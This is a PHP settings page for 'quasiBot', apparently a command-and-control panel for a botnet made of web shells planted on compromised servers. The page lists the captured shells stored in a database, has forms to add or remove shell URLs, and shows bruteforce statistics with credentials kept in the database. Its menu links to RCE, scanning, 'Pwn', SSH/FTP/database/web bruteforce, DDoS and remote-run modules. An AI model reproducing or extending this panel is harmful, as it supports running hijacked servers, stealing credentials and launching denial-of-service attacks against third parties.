<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | conf</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="header">


        <div id="logo">
            <h1><a href="index.php">&nbsp; &nbsp; &nbsp;<?php echo date('H:i:s') ?></a></h1>

<?php
quotes();
?>

        </div>
    </div>
    <div id="menu">
        <ul>
            <li class="txt_left"><?php echo $_SERVER['DOCUMENT_ROOT'] ?></li>
            <li class="txt_left"><?php echo $_SERVER['PHP_SELF'] ?></li>
            <li class="txt_center"><?php echo date("d.m.y"); ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_ADDR'] ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_NAME'] ?></li>
            <li class="txt_right"><?php echo conn('http://bot.whatismyipaddress.com') ?></li>
        </ul>
    </div>
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Settings</a></h2>
                        <div class="entry">
                            <p class="meta"> 
                            Whats up, <?php echo AUTH_USER; ?>?
                            </p>
                            <?php
                            echo '<p>Proxy - '.htmlspecialchars(PROXY_IP).':'.htmlspecialchars(PROXY_PORT).' (SOCKS5)</p>';
                            echo '<p>Using proxy - ';
                            if(USE_PROXY == 1) {
                            echo '<b>Yes</b></p>';
                            } else {
                            echo '<b>No</b></p>';
                            }
                            echo '<p>Using auth - ';
                            if(AUTH_ENABLE == 1) {
                            echo '<b>Yes</b> (<a href="'.$_SERVER['PHP_SELF'].'?logout">logout</a>)</p>';
                            } else {
                            echo '<b>No</b></p>';
                            }
                            echo '<p>Connection - '.htmlspecialchars(SQL_USER).' @ '.htmlspecialchars(SQL_HOST).' using database '.htmlspecialchars(SQL_DB).'</p>';
                            ?>
                        </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">Bots</a></h2>
                        <div class="entry">
                        <p class="meta">Current shells in db</p>
                        <?php
                            showbots();
                        ?>
                          </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">Manage shells</a></h2>
                        <div class="entry">
                            <p class="meta"><?php echo 'Using database '.SQL_DB.' @ '.SQL_HOST; ?></p>
                            <p></p>
                            <table method="post">
                            <tr><td><b>Add - URL</b></td><td><b>Delete - ID</b></td></tr>
                            <tr>
                            <td>
                            <form method="post">
                            <input type='text' name='addurl' style='width: 300px;' value='http://host/path/x.php'> - 
                            <input type='submit' value='Add' /></form>
                            </td>
                            <td>
                            <form method="post">
                            <input type='text' name='rmurl' style='width: 150px;' value='0'> - 
                            <input type='submit' value='Del' /></form></td>
                            </tr>
                            </table>
                        </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">Bruteforce</a></h2>
                        <div class="entry">
                        <p class="meta">Bruteforce statistics &nbsp;&bull;&nbsp; Credentials are stored in db</p>
                        <?php
                            showbrute();
                        ?>
                          </div>
                    </div>
                    <div style="clear: both;">&nbsp;</div>
                </div>
                <div id="sidebar">
                    <ul>
                        <li>
                            <h2>Home</h2>
                            <ul>
                                <li><a href="index.php">Index</a></li>
                                <li><a href="settings.php"><b>Settings</b></a></li>
                                <li><a href="rss.php">RSS</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Hack</h2>
                            <ul>
                                <li><a href="../hack/rce.php">RCE</a></li>
                                <li><a href="../hack/scan.php">Scan</a></li>
                                <li><a href="../hack/pwn.php">Pwn</a></li>
                                <li><a href="../hack/shell.php">Shell</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Bruteforce</h2>
                            <ul>
                                <li><a href="../bf/ssh.php">SSH</a></li>
                                <li><a href="../bf/ftp.php">FTP</a></li>
                                <li><a href="../bf/dbs.php">DB's</a></li>
                                <li><a href="../bf/www.php">WWW</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Tools</h2>
                            <ul>
                                <li><a href="../tools/sql.php">MySQL Manager</a></li>
                                <li><a href="../tools/hostscan.php">HostScan</a></li>
                             </ul>
                        </li>
                        <li>
                           <h2>Bots</h2>
                            <ul>
                                <li><a href="../hack/ddos.php">DDoS</a></li>
                                <li><a href="../hack/more.php">Run</a></li>
                             </ul>
                        </li>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
<div id="footer">
    <p><?php echo $_SERVER['SERVER_SOFTWARE']; echo '  -  '; echo $_SERVER['HTTP_USER_AGENT'] ?></p>
</div>
</body>
</html>
